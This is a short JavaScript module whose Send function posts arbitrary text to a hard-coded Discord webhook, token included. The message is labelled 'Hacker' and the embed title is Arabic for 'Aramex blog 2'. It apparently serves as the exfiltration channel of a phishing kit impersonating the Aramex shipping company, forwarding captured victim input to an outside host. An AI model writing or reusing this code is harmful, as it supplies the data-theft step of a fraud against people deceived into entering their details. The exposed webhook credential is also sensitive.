import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1329527380582076496/8UC-qfH2DgMacSVnpzefDNwFqOZi_EWWjZYmiuvFppNPXkdSfUMQ6xSp531qpT8oHfMG",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
